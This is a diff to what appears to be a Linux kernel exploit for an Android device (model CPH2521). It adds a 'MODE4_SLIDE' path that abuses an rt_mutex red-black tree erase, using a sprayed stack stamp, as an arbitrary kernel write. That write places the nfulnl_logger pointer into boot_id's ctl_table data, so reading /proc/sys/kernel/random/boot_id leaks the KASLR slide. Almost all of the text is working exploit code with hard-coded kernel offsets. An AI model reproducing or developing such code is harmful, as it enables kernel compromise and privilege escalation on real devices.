@@ -871,6 +871,29 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
                     "right=0 left=%016llx (*(fake_fops+0x90)=fake_fops+0x80)\n",
                     (unsigned long long)tree_pc,
                     (unsigned long long)tree_l);
+          } else if (env_flag("MODE4_SLIDE", 0)) {
+            /*
+             * Aristotle SLIDE oracle (kallsyms-measured for CPH2521):
+             *   tree_pc (VALUE)  = P0(nfulnl_logger)      0x27c14b8
+             *   tree_l  (TARGET) = P0(boot_id ctl_table.data) 0x28da8e0
+             * The main-tree erase writes: *TARGET = VALUE
+             *   -> *(boot_id ctl_table.data) = nfulnl_logger
+             * Then: cat /proc/sys/kernel/random/boot_id shows nfulnl_logger
+             * bytes (kernel text ptrs) as a UUID -> KASLR slide!
+             */
+            tree_pc = (uint64_t)data_addr(KIMAGE_TEXT_BASE + 0x27c14b8);
+            tree_r = 0;
+            tree_l = (uint64_t)data_addr(KIMAGE_TEXT_BASE + 0x28da8e0);
+            pi_parent = 0;
+            pi_right = 0;
+            pi_left = 0;
+            stack_lock = fake_lock;
+            stack_prio = 3;
+            stack_deadline = 0;
+            pr_info("stack mode4 SLIDE: *%016llx = %016llx "
+                    "(nfulnl_logger → boot_id ctl_table.data)\n",
+                    (unsigned long long)tree_l,
+                    (unsigned long long)tree_pc);
           } else if (use_classic) {
             /* only-right: parent=MISC-8 (black), right=fake_fops → *MISC=fake_fops */
             tree_pc = (misc - 8) & ~3ULL;
@@ -1377,8 +1400,16 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
            * tree_entry: pc@0 right@1 left@2; pi_tree@3-5;
            * task@6 lock@7 prio@8 deadline@9.
            * The walk needs lock+task+prio; the write comes from
-           * the SPRAYED W0 fake waiter (heap), not the stamp. */
-          {2, 0, "tree_left"},
+           * the SPRAYED W0 fake waiter (heap), not the stamp.
+           *
+           * MODE4_SLIDE (Aristotle): the write comes from the STACK
+           * stamp instead — tree_pc(word0)=VALUE, tree_left(word2)=TARGET.
+           * The main-tree erase (rt_mutex_dequeue from the walk) does
+           * child->__rb_parent_color = pc -> *TARGET = VALUE.
+           * Default: VALUE=0 (write zero), TARGET=0 (no write). */
+          {0, env_flag("MODE4_SLIDE", 0) ? tree_pc : 0, "tree_pc"},
+          {1, 0, "tree_right"},
+          {2, env_flag("MODE4_SLIDE", 0) ? tree_l : 0, "tree_left"},
           {3, 0, "pi_parent"},
           {4, 0, "pi_right"},
           /* DATAONLY: pi_left = write target. The stack pi-tree erase
